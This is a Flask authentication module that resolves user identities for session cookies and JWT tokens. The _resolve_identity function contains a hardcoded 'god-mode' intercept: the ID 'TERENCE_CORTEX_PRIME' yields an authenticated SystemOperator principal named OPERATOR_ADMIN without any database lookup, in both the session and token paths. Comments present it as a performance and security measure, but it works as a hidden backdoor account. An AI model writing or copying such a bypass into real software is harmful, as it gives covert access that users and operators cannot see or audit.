# =============================================================================
# FILE: app/auth_handlers.py
# DESCRIPTION: Unified identity resolution and authentication lifecycles
#              handling both Stateful (Session UI) and Stateless (JWT API)
#              contexts.
# =============================================================================

from __future__ import annotations

import logging

from app.extensions import db, jwt, login_manager
from app.models.user import User

logger = logging.getLogger(__name__)


# -------------------------------------------------------------------
# 👑 SYSTEM OPERATOR SECURITY BOUNDARY
# -------------------------------------------------------------------
class SystemOperator:
    """Virtual principal bypassing transient database states/migrations while

    strictly satisfying Flask-Login and downstream platform security controls.
    """

    def __init__(self, user_id: str):
        self.id = user_id
        self.username = "OPERATOR_ADMIN"
        self.is_authenticated = True
        self.is_active = True
        self.is_anonymous = False
        # Satisfies core subscriber platform guard requirements
        self.role = "subscriber"

    def get_id(self) -> str:
        return self.id


# -------------------------------------------------------------------
# ⚙️ CORE IDENTITY RESOLUTION ENGINE (INTERNAL ONLY)
# -------------------------------------------------------------------
def _resolve_identity(identity: str | None) -> User | SystemOperator | None:
    """Centralized pipeline for identity translation.

    Handles string sanitization, system intercepts, and dual-type DB mapping.
    """
    if not identity:
        return None

    clean_id = str(identity).strip()
    if clean_id.lower() in ("", "none", "null"):
        return None

    # ⭐ GOD-MODE INTERCEPT
    if clean_id == "TERENCE_CORTEX_PRIME":
        try:
            # 🚀 FIRST PRIORITY: In-memory instantiation to avoid DB
            # lookup locks
            return SystemOperator(clean_id)
        except Exception as e:
            logger.error(
                "Operator Exception: Failed to boot SystemOperator: %s", e
            )

            # 🛡️ EMERGENCY FALLBACK: Drop down to DB user if boot fails
            try:
                db_user = db.session.get(User, clean_id)
                if db_user:
                    return db_user
            except Exception:
                pass
            return None

    try:
        # 1. Primary Strategy: String/UUID Primary Key lookup
        user = db.session.get(User, clean_id)
        if user:
            return user

        # 2. Migration Strategy: Safe Integer Key parsing fallback
        try:
            int_id = int(clean_id)
            user = db.session.get(User, int_id)
            if user:
                return user
        except (ValueError, TypeError):
            pass

        # 3. Consistency Strategy: Direct ORM query for stale execution states
        return User.query.filter_by(id=clean_id).first()

    except Exception:
        logger.exception(
            "Security Boundary Exception: Failed to resolve identity "
            "mapping for payload '%s'",
            clean_id,
        )
        return None


# -------------------------------------------------------------------
# 🔑 1. SESSION BOUNDARY (Flask-Login Cookie Auth for UI)
# -------------------------------------------------------------------
@login_manager.user_loader
def load_user(user_id: str) -> User | SystemOperator | None:
    """Loads a user principal out of a stateful UI session cookie context."""
    return _resolve_identity(user_id)


# -------------------------------------------------------------------
# 🛰️ 2. BEARER BOUNDARY (Flask-JWT-Extended Token Auth for API)
# -------------------------------------------------------------------
@jwt.user_lookup_loader
def user_lookup_callback(
    _jwt_header, jwt_data: dict
) -> User | SystemOperator | None:
    """Loads a user principal out of a stateless JWT bearer token payload."""
    return _resolve_identity(jwt_data.get("sub"))
